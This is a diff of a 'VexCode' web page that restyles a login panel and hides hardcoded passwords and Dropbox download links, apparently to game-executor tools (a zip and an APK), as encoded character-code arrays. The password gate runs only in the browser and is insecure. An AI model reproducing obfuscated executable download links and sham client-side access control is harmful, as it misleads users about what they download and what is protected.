@@ -6,36 +6,119 @@
 <title>VexCode</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
 <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
-    body { background: linear-gradient(135deg, #0f172a, #1e293b); color: white; overflow-x: hidden; min-height: 100vh; }
-    header { display: flex; justify-content: space-between; align-items: center; padding: 25px 8%; }
-    .logo { font-weight: 800; font-size: 1.4rem; letter-spacing: 1px; }
-    
-    .hero { text-align: center; padding: 50px 10%; }
-    .hero h1 { font-size: 3.5rem; font-weight: 800; background: linear-gradient(90deg, #38bdf8, #818cf8); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-    
-    #login { text-align: center; margin-top: 50px; background: rgba(255,255,255,0.03); padding: 30px; border-radius: 20px; display: inline-block; border: 1px solid rgba(255,255,255,0.1); }
-    #login input { padding: 12px; font-size: 1rem; margin: 10px 0; border-radius: 8px; border: 1px solid #334155; background: #1e293b; color: white; width: 250px; outline: none; }
-    #login button { padding: 12px 30px; border-radius: 50px; border: none; background: #6366f1; color: white; cursor: pointer; font-weight: 600; width: 100%; transition: 0.3s; }
-    
-    .download-btn { padding: 16px 40px; border-radius: 50px; background: linear-gradient(90deg, #6366f1, #3b82f6); color: white; text-decoration: none; font-weight: 600; display: inline-block; margin: 10px; }
-    
-    #content, #imageArea, #voiceArea { display: none; margin-top: 40px; }
-    #imageArea img { max-width: 90%; border-radius: 15px; border: 2px solid #38bdf8; margin-top: 20px; }
-    .voice-msg { color: #10b981; font-weight: 600; font-size: 1.2rem; }
+* { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+
+body {
+    background: #000000;
+    color: white;
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+header { display: none; }
+
+.hero {
+    width: 100%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+.hero h1 { display: none; }
+
+#login {
+    width: 340px;
+    padding: 40px 30px;
+    border-radius: 25px;
+    background: rgba(20,20,20,0.9);
+    border: 1px solid rgba(255,255,255,0.08);
+    box-shadow: 0 0 40px rgba(99,102,241,0.25);
+    backdrop-filter: blur(10px);
+    text-align: center;
+}
+
+#login h2 {
+    font-weight: 700;
+    margin-bottom: 25px;
+    letter-spacing: 2px;
+}
+
+#login input {
+    width: 100%;
+    padding: 14px;
+    margin: 12px 0;
+    border-radius: 12px;
+    border: 1px solid #222;
+    background: #0f0f0f;
+    color: white;
+    outline: none;
+    transition: 0.3s;
+}
+
+#login input:focus {
+    border: 1px solid #6366f1;
+    box-shadow: 0 0 10px rgba(99,102,241,0.6);
+}
+
+#login button {
+    width: 100%;
+    padding: 14px;
+    margin-top: 15px;
+    border-radius: 50px;
+    border: none;
+    background: linear-gradient(90deg, #6366f1, #3b82f6);
+    color: white;
+    font-weight: 600;
+    cursor: pointer;
+    transition: 0.3s;
+}
+
+#login button:hover {
+    transform: scale(1.05);
+    box-shadow: 0 0 20px rgba(99,102,241,0.6);
+}
+
+.download-btn {
+    padding: 16px 40px;
+    border-radius: 50px;
+    background: linear-gradient(90deg, #6366f1, #3b82f6);
+    color: white;
+    text-decoration: none;
+    font-weight: 600;
+    display: inline-block;
+    margin: 10px;
+}
+
+#content, #imageArea, #voiceArea {
+    display: none;
+    margin-top: 40px;
+    text-align: center;
+}
+
+#imageArea img {
+    max-width: 90%;
+    border-radius: 15px;
+    border: 2px solid #6366f1;
+    margin-top: 20px;
+}
+
+.voice-msg {
+    color: #10b981;
+    font-weight: 600;
+    font-size: 1.2rem;
+}
 </style>
 </head>
 <body>
 
-<header><div class="logo">VexCode</div></header>
-
 <section class="hero">
-    <h1>Powerful. Clean. Fast.</h1>
     <div id="login">
-        <h2>Access Panel</h2>
+        <h2>ACCESS</h2>
         <input type="text" id="user" placeholder="Username"><br>
         <input type="password" id="pass" placeholder="Password"><br>
-        <button onclick="checkLogin()">Unlock</button>
+        <button onclick="checkLogin()">Enter</button>
         <p id="msg" style="color:#f87171; margin-top: 10px;"></p>
     </div>
 
@@ -58,11 +141,11 @@
 const pcLinkNums = [104,116,116,112,115,58,47,47,119,119,119,46,100,114,111,112,98,111,120,46,99,111,109,47,115,99,108,47,102,105,47,97,100,122,114,112,99,56,48,107,113,102,117,109,122,102,103,54,53,107,50,122,47,88,101,110,111,45,118,49,46,51,46,50,53,98,46,122,105,112,63,114,108,107,101,121,61,103,51,101,114,104,113,119,57,119,117,120,101,119,106,54,103,111,99,98,48,118,117,100,103,49,38,115,116,61,98,109,49,115,50,118,114,111,38,100,108,61,49];
 const androidLinkNums = [104,116,116,112,115,58,47,47,119,119,119,46,100,114,111,112,98,111,120,46,99,111,109,47,115,99,108,47,102,105,47,56,55,115,98,52,52,118,121,109,122,109,108,50,121,108,97,115,56,55,114,54,47,68,101,108,116,97,69,120,101,99,117,116,111,114,45,118,50,46,55,48,57,46,97,112,107,63,114,108,107,101,121,61,105,114,111,57,119,114,113,119,102,103,111,97,108,113,48,48,53,119,54,50,112,99,116,117,49,112,38,115,116,61,122,100,109,107,48,99,48,119,38,100,108,61,49];
 
-const passDL = [48,53,51,50,57,53,48,57,46,99,111,100,101]; // 05329509.code
-const passImgOriginal = [99,111,100,101,46,48,53,51,50,57,53,48,57]; // code.05329509
-const voicePath = [115, 121, 115, 45, 109, 101, 116, 97, 100, 97, 116, 97, 47, 118, 111, 105, 99, 101, 46, 109, 112, 51];
-const passVoice = [118, 111, 105, 99, 101, 46, 48, 48, 49]; // voice.001
-const secretPath = [115, 121, 115, 45, 109, 101, 116, 97, 100, 97, 116, 97, 47, 99, 111, 110, 102, 105, 103, 95, 48, 52, 50, 46, 100, 97, 116, 46, 106, 112, 103];
+const passDL = [48,53,51,50,57,53,48,57,46,99,111,100,101];
+const passImgOriginal = [99,111,100,101,46,48,53,51,50,57,53,48,57];
+const voicePath = [115,121,115,45,109,101,116,97,100,97,116,97,47,118,111,105,99,101,46,109,112,51];
+const passVoice = [118,111,105,99,101,46,48,48,49];
+const secretPath = [115,121,115,45,109,101,116,97,100,97,116,97,47,99,111,110,102,105,103,95,48,52,50,46,100,97,116,46,106,112,103];
 
 function decode(nums) { return String.fromCharCode(...nums); }
 
@@ -71,27 +154,23 @@ function checkLogin() {
     const pass = document.getElementById('pass').value.trim();
     const msg = document.getElementById('msg');
 
-    // Reset views
     document.getElementById('content').style.display = 'none';
     document.getElementById('imageArea').style.display = 'none';
     document.getElementById('voiceArea').style.display = 'none';
     msg.innerText = '';
 
     if (user === 'VexCode') {
-        // Check for Voice
         if (pass === decode(passVoice)) {
             document.getElementById('voiceArea').style.display = 'block';
             let audio = new Audio(decode(voicePath));
             audio.play().catch(() => { msg.innerText = "Click again to play audio."; });
         }
-        // Check for Downloads
         else if (pass === decode(passDL)) {
             document.getElementById('login').style.display = 'none';
             document.getElementById('pcDownload').href = decode(pcLinkNums);
             document.getElementById('androidDownload').href = decode(androidLinkNums);
             document.getElementById('content').style.display = 'flex';
         } 
-        // Check for Image
         else if (pass === decode(passImgOriginal)) {
             document.getElementById('login').style.display = 'none';
             document.getElementById('secretImg').src = decode(secretPath) + '?v=' + Date.now();
